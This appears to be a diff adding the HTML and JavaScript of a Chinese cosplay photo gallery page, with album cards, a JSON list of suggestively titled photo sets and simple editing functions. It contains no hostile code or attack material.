+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#小仓千代w 源赖光僵尸娘 45P525MB</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_123.jpg" alt="Cover" onclick="openDetail(1789846087084)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_124.jpg" alt="Cover" onclick="openDetail(1789846087084)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_125.jpg" alt="Cover" onclick="openDetail(1789846087084)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#星澜是澜澜叫澜妹呀&nbsp; 胜利女神</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_126.jpg" alt="Cover" onclick="openDetail(1789846087601)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_127.jpg" alt="Cover" onclick="openDetail(1789846087601)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_128.jpg" alt="Cover" onclick="openDetail(1789846087601)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">云溪溪 #奶桃桃 暗忍 80P1V1.49GB</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_129.jpg" alt="Cover" onclick="openDetail(1789846088120)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_130.jpg" alt="Cover" onclick="openDetail(1789846088120)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_131.jpg" alt="Cover" onclick="openDetail(1789846088120)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#纸悦Etsu_ko 碧蓝航线 长门旗袍[35P-336MB]</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_132.jpg" alt="Cover" onclick="openDetail(1789846088495)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_133.jpg" alt="Cover" onclick="openDetail(1789846088495)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_134.jpg" alt="Cover" onclick="openDetail(1789846088495)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#纸悦Etsu_ko 透明竞泳[65P-727MB]</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_135.jpg" alt="Cover" onclick="openDetail(1789846088735)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_136.jpg" alt="Cover" onclick="openDetail(1789846088735)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_137.jpg" alt="Cover" onclick="openDetail(1789846088735)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#桜井宁宁 纯白毛衣 50P1V363MB</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_138.jpg" alt="Cover" onclick="openDetail(1789846088907)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_139.jpg" alt="Cover" onclick="openDetail(1789846088907)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_140.jpg" alt="Cover" onclick="openDetail(1789846088907)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#rioko凉凉子 碧蓝航线 信浓 旗袍 相融一梦</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_141.jpg" alt="Cover" onclick="openDetail(1789846089047)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_142.jpg" alt="Cover" onclick="openDetail(1789846089047)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_143.jpg" alt="Cover" onclick="openDetail(1789846089047)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#rioko凉凉子 碧蓝航线 怨仇 旗袍 杯盏盈芳华</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_144.jpg" alt="Cover" onclick="openDetail(1789846089355)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_145.jpg" alt="Cover" onclick="openDetail(1789846089355)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_146.jpg" alt="Cover" onclick="openDetail(1789846089355)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">#rioko凉凉子 兴登堡旗袍 深阁舞戏 25P236MB</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_147.jpg" alt="Cover" onclick="openDetail(1789846089776)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_148.jpg" alt="Cover" onclick="openDetail(1789846089776)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_149.jpg" alt="Cover" onclick="openDetail(1789846089776)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="card">
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">布丁 死库水120p6v</div>
+                        <div class="tag" contenteditable="false">Cosplay 写真</div>
+                    </div>
+                <div class="image-grid"><div class="image-wrapper">
+                        <img src="images/img_150.jpg" alt="Cover" onclick="openDetail(1789846090219)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_151.jpg" alt="Cover" onclick="openDetail(1789846090219)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div><div class="image-wrapper">
+                        <img src="images/img_152.jpg" alt="Cover" onclick="openDetail(1789846090219)" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    </div></div><div class="view-more">查看更多 ➔</div></div><div class="add-card-btn">➕ 新增一组 Cosplay 图集</div></div>
+
+        <div class="bottom-nav">
+            <div class="bottom-nav-item active" onclick="goHome()">
+                <span>🏠</span>首页
+            </div>
+            <div class="bottom-nav-item" onclick="refreshData()">
+                <span>🔄</span>刷新
+            </div>
+            <div class="bottom-nav-item">
+                <span>❤️</span>心动
+            </div>
+        </div>
+    </div>
+
+    <!-- 详情页 -->
+    <div id="detailPage" style="display: none;">
+        <div class="detail-header">
+            <button class="back-btn" onclick="closeDetail()">←</button>
+            <div class="detail-title" id="detailTitle" contenteditable="false">#五更百鬼 胜利女神 妮姬 桃乐丝旗袍 12P48MB</div>
+            <div class="detail-tag" id="detailTag" contenteditable="false">Cosplay 写真</div>
+        </div>
+        <div class="detail-image-container" id="detailImageContainer"><div class="detail-image-item">
+                    <img src="images/img_001.jpg" alt="大图" onerror="this.src='https://via.placeholder.com/800x1000/333/fff?text=No+Image'">
+                    
+                </div><div class="detail-image-item">
+                    <img src="images/img_002.jpg" alt="大图" onerror="this.src='https://via.placeholder.com/800x1000/333/fff?text=No+Image'">
+                    
+                </div><div class="detail-image-item">
+                    <img src="images/img_003.jpg" alt="大图" onerror="this.src='https://via.placeholder.com/800x1000/333/fff?text=No+Image'">
+                    
+                </div></div>
+        
+    </div>
+
+    
+    
+    
+
+    <div id="toast" class="">✅ 纯净版已下载！上传到服务器即可</div>
+
+    <script>
+        // ==================== 数据 ====================
+        let siteData = {
+          "siteTitle": "Cosplay 研究所",
+          "siteSubtitle": "— 注册畅享全站浏览权限 —",
+          "cards": [
+                    {
+                              "id": 1,
+                              "title": "#日奈娇 见习女仆 183P5V3.16GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_001.jpg",
+                                        "images/img_002.jpg",
+                                        "images/img_003.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_001.jpg",
+                                        "images/img_002.jpg",
+                                        "images/img_003.jpg",
+                                        "images/img_004.jpg",
+                                        "images/img_003.jpg"
+                              ]
+                    },
+                    {
+                              "id": 2,
+                              "title": "#疯猫ss 沙发职装 40P316MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_005.jpg",
+                                        "images/img_006.jpg",
+                                        "images/img_007.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_005.jpg",
+                                        "images/img_006.jpg",
+                                        "images/img_007.jpg",
+                                        "images/img_008.jpg",
+                                        "images/img_009.jpg"
+                              ]
+                    },
+                    {
+                              "id": 3,
+                              "title": "#yuuhui玉汇 入职考核 120P1V1.01GB",
+                              "tag": "漫展返图",
+                              "coverImages": [
+                                        "images/img_010.jpg",
+                                        "images/img_011.jpg",
+                                        "images/img_012.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_010.jpg",
+                                        "images/img_011.jpg",
+                                        "images/img_012.jpg",
+                                        "images/img_013.jpg",
+                                        "images/img_014.jpg",
+                                        "images/img_015.jpg"
+                              ]
+                    },
+                    {
+                              "id": 4,
+                              "title": "布丁 Perohub- #白虎 #少女 #足控 ",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_016.jpg",
+                                        "images/img_017.jpg",
+                                        "images/img_018.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_016.jpg",
+                                        "images/img_017.jpg",
+                                        "images/img_018.jpg",
+                                        "images/img_019.jpg",
+                                        "images/img_020.jpg",
+                                        "images/img_021.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846079983,
+                              "title": "#Bangni邦尼 莉莉丝 82P4V1.15GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_022.jpg",
+                                        "images/img_023.jpg",
+                                        "images/img_024.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_022.jpg",
+                                        "images/img_023.jpg",
+                                        "images/img_024.jpg",
+                                        "images/img_025.jpg",
+                                        "images/img_026.jpg",
+                                        "images/img_027.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846080551,
+                              "title": "#Bangni邦尼 网袜兔女郎 76P-2.06GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_028.jpg",
+                                        "images/img_029.jpg",
+                                        "images/img_030.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_028.jpg",
+                                        "images/img_029.jpg",
+                                        "images/img_030.jpg",
+                                        "images/img_031.jpg",
+                                        "images/img_032.jpg",
+                                        "images/img_033.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846080709,
+                              "title": "#可可小白兔 不要打游戏惹 打兔兔 76P337MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_034.jpg",
+                                        "images/img_035.jpg",
+                                        "images/img_036.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_034.jpg",
+                                        "images/img_035.jpg",
+                                        "images/img_036.jpg",
+                                        "images/img_037.jpg",
+                                        "images/img_038.jpg",
+                                        "images/img_039.jpg",
+                                        "images/img_040.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846080835,
+                              "title": "#桜井宁宁 红绳女巫 119P2V1.02GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_041.jpg",
+                                        "images/img_042.jpg",
+                                        "images/img_043.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_041.jpg",
+                                        "images/img_042.jpg",
+                                        "images/img_043.jpg",
+                                        "images/img_044.jpg",
+                                        "images/img_045.jpg",
+                                        "images/img_046.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846080985,
+                              "title": "#Machi馬吉 花火 107P",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_047.jpg",
+                                        "images/img_048.jpg",
+                                        "images/img_049.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_047.jpg",
+                                        "images/img_048.jpg",
+                                        "images/img_049.jpg",
+                                        "images/img_050.jpg",
+                                        "images/img_051.jpg",
+                                        "images/img_052.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846081116,
+                              "title": "#溯兮sukki 胜利女神 – 妮姬伊莱格 兔女郎",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_053.jpg",
+                                        "images/img_054.jpg",
+                                        "images/img_055.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_053.jpg",
+                                        "images/img_054.jpg",
+                                        "images/img_055.jpg",
+                                        "images/img_056.jpg",
+                                        "images/img_057.jpg",
+                                        "images/img_058.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846081249,
+                              "title": "#日奈娇 25年06月 月刊 – 视图 134P3V467MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_059.jpg",
+                                        "images/img_060.jpg",
+                                        "images/img_061.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_059.jpg",
+                                        "images/img_060.jpg",
+                                        "images/img_061.jpg",
+                                        "images/img_062.jpg",
+                                        "images/img_063.jpg",
+                                        "images/img_064.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846082090,
+                              "title": "麻薯-雄黄·醉梦 [126P-982MB]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_065.jpg",
+                                        "images/img_066.jpg",
+                                        "images/img_067.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_065.jpg",
+                                        "images/img_066.jpg",
+                                        "images/img_067.jpg",
+                                        "images/img_068.jpg",
+                                        "images/img_069.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846082248,
+                              "title": "#蠢沫沫 宴",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_070.jpg",
+                                        "images/img_071.jpg",
+                                        "images/img_072.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_070.jpg",
+                                        "images/img_071.jpg",
+                                        "images/img_072.jpg",
+                                        "images/img_073.jpg",
+                                        "images/img_074.jpg",
+                                        "images/img_075.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846082380,
+                              "title": "#浅安安 妙龄太太 [80P-861MB]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_076.jpg",
+                                        "images/img_077.jpg",
+                                        "images/img_078.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_076.jpg",
+                                        "images/img_077.jpg",
+                                        "images/img_078.jpg",
+                                        "images/img_079.jpg",
+                                        "images/img_080.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846082801,
+                              "title": "#Natsuko夏夏子",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_081.jpg",
+                                        "images/img_082.jpg",
+                                        "images/img_083.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_081.jpg",
+                                        "images/img_082.jpg",
+                                        "images/img_083.jpg",
+                                        "images/img_084.jpg",
+                                        "images/img_085.jpg",
+                                        "images/img_086.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846083200,
+                              "title": "#Machi馬吉 Firefly",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_087.jpg",
+                                        "images/img_088.jpg",
+                                        "images/img_089.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_087.jpg",
+                                        "images/img_088.jpg",
+                                        "images/img_089.jpg",
+                                        "images/img_090.jpg",
+                                        "images/img_091.jpg",
+                                        "images/img_092.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846083635,
+                              "title": "#Quan冉有点饿 安克雷奇泳装 47P368MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_093.jpg",
+                                        "images/img_094.jpg",
+                                        "images/img_095.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_093.jpg",
+                                        "images/img_094.jpg",
+                                        "images/img_095.jpg",
+                                        "images/img_096.jpg",
+                                        "images/img_097.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846084017,
+                              "title": "#湖里狸里狸 马修花嫁 30P207MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_098.jpg",
+                                        "images/img_099.jpg",
+                                        "images/img_100.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_098.jpg",
+                                        "images/img_099.jpg",
+                                        "images/img_100.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846084204,
+                              "title": "#奈汐酱nice 可可奶昔[101P-1V-1.77G]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_101.jpg",
+                                        "images/img_102.jpg",
+                                        "images/img_103.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_101.jpg",
+                                        "images/img_102.jpg",
+                                        "images/img_103.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846084400,
+                              "title": "#奈汐酱nice&奶桃 夏纪 100P1V2.52GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_104.jpg",
+                                        "images/img_105.jpg",
+                                        "images/img_106.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_104.jpg",
+                                        "images/img_105.jpg",
+                                        "images/img_106.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846084563,
+                              "title": "#浅安安 - 满糖奶盖 [53P 523M]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_107.jpg",
+                                        "images/img_108.jpg",
+                                        "images/img_109.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_107.jpg",
+                                        "images/img_108.jpg",
+                                        "images/img_109.jpg",
+                                        "images/img_110.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846084698,
+                              "title": "#浅安安 女仆教育 80P1V2.39GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_111.jpg",
+                                        "images/img_112.jpg",
+                                        "images/img_113.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_111.jpg",
+                                        "images/img_112.jpg",
+                                        "images/img_113.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846085629,
+                              "title": "#雯妹不讲道理 特务W [56P1V-1.08GB]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_114.jpg",
+                                        "images/img_115.jpg",
+                                        "images/img_116.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_114.jpg",
+                                        "images/img_115.jpg",
+                                        "images/img_116.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846086148,
+                              "title": "#五更百鬼 胜利女神 妮姬 桃乐丝旗袍 12P48MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_117.jpg",
+                                        "images/img_118.jpg",
+                                        "images/img_119.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_117.jpg",
+                                        "images/img_118.jpg",
+                                        "images/img_119.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846086597,
+                              "title": "#小仓千代w 蔚蓝档案 同人修女服 64P185MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_120.jpg",
+                                        "images/img_121.jpg",
+                                        "images/img_122.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_120.jpg",
+                                        "images/img_121.jpg",
+                                        "images/img_122.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846087084,
+                              "title": "#小仓千代w 源赖光僵尸娘 45P525MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_123.jpg",
+                                        "images/img_124.jpg",
+                                        "images/img_125.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_123.jpg",
+                                        "images/img_124.jpg",
+                                        "images/img_125.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846087601,
+                              "title": "#星澜是澜澜叫澜妹呀  胜利女神",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_126.jpg",
+                                        "images/img_127.jpg",
+                                        "images/img_128.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_126.jpg",
+                                        "images/img_127.jpg",
+                                        "images/img_128.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846088120,
+                              "title": "云溪溪 #奶桃桃 暗忍 80P1V1.49GB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_129.jpg",
+                                        "images/img_130.jpg",
+                                        "images/img_131.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_129.jpg",
+                                        "images/img_130.jpg",
+                                        "images/img_131.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846088495,
+                              "title": "#纸悦Etsu_ko 碧蓝航线 长门旗袍[35P-336MB]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_132.jpg",
+                                        "images/img_133.jpg",
+                                        "images/img_134.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_132.jpg",
+                                        "images/img_133.jpg",
+                                        "images/img_134.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846088735,
+                              "title": "#纸悦Etsu_ko 透明竞泳[65P-727MB]",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_135.jpg",
+                                        "images/img_136.jpg",
+                                        "images/img_137.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_135.jpg",
+                                        "images/img_136.jpg",
+                                        "images/img_137.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846088907,
+                              "title": "#桜井宁宁 纯白毛衣 50P1V363MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_138.jpg",
+                                        "images/img_139.jpg",
+                                        "images/img_140.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_138.jpg",
+                                        "images/img_139.jpg",
+                                        "images/img_140.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846089047,
+                              "title": "#rioko凉凉子 碧蓝航线 信浓 旗袍 相融一梦",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_141.jpg",
+                                        "images/img_142.jpg",
+                                        "images/img_143.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_141.jpg",
+                                        "images/img_142.jpg",
+                                        "images/img_143.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846089355,
+                              "title": "#rioko凉凉子 碧蓝航线 怨仇 旗袍 杯盏盈芳华",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_144.jpg",
+                                        "images/img_145.jpg",
+                                        "images/img_146.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_144.jpg",
+                                        "images/img_145.jpg",
+                                        "images/img_146.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846089776,
+                              "title": "#rioko凉凉子 兴登堡旗袍 深阁舞戏 25P236MB",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_147.jpg",
+                                        "images/img_148.jpg",
+                                        "images/img_149.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_147.jpg",
+                                        "images/img_148.jpg",
+                                        "images/img_149.jpg"
+                              ]
+                    },
+                    {
+                              "id": 1789846090219,
+                              "title": "布丁 死库水120p6v",
+                              "tag": "Cosplay 写真",
+                              "coverImages": [
+                                        "images/img_150.jpg",
+                                        "images/img_151.jpg",
+                                        "images/img_152.jpg"
+                              ],
+                              "allImages": [
+                                        "images/img_150.jpg",
+                                        "images/img_151.jpg",
+                                        "images/img_152.jpg"
+                              ]
+                    }
+          ]
+};
+
+        let isAdminMode = false;
+        let currentDetailCardId = null;
+        let currentEditCardId = null;
+        let currentEditImageIndex = null;
+
+        // ==================== 初始化 ====================
+        function init() {
+            renderHome();
+        }
+
+        function saveDraft() {
+            /* draft disabled in pure version */
+        }
+
+        // ==================== 渲染首页 ====================
+        function renderHome() {
+            document.getElementById('siteTitle').innerText = siteData.siteTitle;
+            document.getElementById('siteTitle').contentEditable = false;
+            
+            document.getElementById('siteSubtitle').innerText = siteData.siteSubtitle;
+            document.getElementById('siteSubtitle').contentEditable = false;
+
+            const container = document.getElementById('galleryContainer');
+            container.innerHTML = '';
+
+            if (siteData.cards.length === 0) {
+                container.innerHTML = '<div style="text-align:center;color:#888;padding:40px;">暂无图集</div>';
+            }
+
+            siteData.cards.forEach((card) => {
+                const cardDiv = document.createElement('div');
+                cardDiv.className = 'card';
+
+                cardDiv.innerHTML = `
+                    
+                    <div class="card-header">
+                        <div class="card-title" contenteditable="false">${card.title}</div>
+                        <div class="tag" contenteditable="false">${card.tag}</div>
+                    </div>
+                `;
+
+                const imageGrid = document.createElement('div');
+                imageGrid.className = 'image-grid';
+                
+                card.coverImages.forEach((imgSrc, imgIndex) => {
+                    const imgWrapper = document.createElement('div');
+                    imgWrapper.className = 'image-wrapper';
+                    imgWrapper.innerHTML = `
+                        <img src="${imgSrc}" alt="Cover" onclick="openDetail(${card.id})" onerror="this.src='https://via.placeholder.com/400x400/333/fff?text=No+Image'">
+                        
+                    `;
+                    imageGrid.appendChild(imgWrapper);
+                });
+
+                cardDiv.appendChild(imageGrid);
+
+                const viewMore = document.createElement('div');
+                viewMore.className = 'view-more';
+                viewMore.innerText = '查看更多 ➔';
+                viewMore.onclick = () => openDetail(card.id);
+                cardDiv.appendChild(viewMore);
+
+                container.appendChild(cardDiv);
+            });
+
+            const addBtn = document.createElement('div');
+            addBtn.className = 'add-card-btn';
+            addBtn.innerText = '➕ 新增一组 Cosplay 图集';
+            addBtn.onclick = addNewCard;
+            container.appendChild(addBtn);
+        }
+
+        // ==================== 编辑模式 ====================
+        function toggleAdmin() {
+            isAdminMode = !isAdminMode;
+            const btn = document.getElementById('adminToggle');
+            const panel = document.getElementById('exportPanel');
+            
+            if (isAdminMode) {
+                btn.innerText = '💾 编辑中';
+                btn.classList.add('active');
+                document.body.classList.add('admin-mode');
+                panel.classList.add('show');
+            } else {
+                btn.innerText = '✏️ 编辑模式';
+                btn.classList.remove('active');
+                document.body.classList.remove('admin-mode');
+                panel.classList.remove('show');
+            }
+            renderHome();
+            if (currentDetailCardId) renderDetail(currentDetailCardId);
+        }
+
+        // ==================== 文字修改 ====================
+        function updateSiteTitle(text) { siteData.siteTitle = text; saveDraft(); }
+        function updateSiteSubtitle(text) { siteData.siteSubtitle = text; saveDraft(); }
+        function updateCardTitle(id, text) {
+            const card = siteData.cards.find(c => c.id === id);
+            if (card) card.title = text;
+            saveDraft();
+        }
+        function updateCardTag(id, text) {
+            const card = siteData.cards.find(c => c.id === id);
+            if (card) card.tag = text;
+            saveDraft();
+        }
+        function updateDetailTitle(text) {
+            const card = siteData.cards.find(c => c.id === currentDetailCardId);
+            if (card) card.title = text;
+            saveDraft();
+        }
+        function updateDetailTag(text) {
+            const card = siteData.cards.find(c => c.id === currentDetailCardId);
+            if (card) card.tag = text;
+            saveDraft();
+        }
+
+        // ==================== 卡片增删 ====================
+        function deleteCard(id) {
+            if (!confirm('确定要删除这组图集吗？')) return;
+            siteData.cards = siteData.cards.filter(c => c.id !== id);
+            saveDraft();
+            renderHome();
+        }
+
+        function addNewCard() {
+            const newId = Date.now();
+            siteData.cards.push({
+                id: newId,
+                title: '点击这里修改标题',
+                tag: 'Cosplay 写真',
+                coverImages: [
+                    'https://images.unsplash.com/photo-1541562232579-512a21360020?w=400',
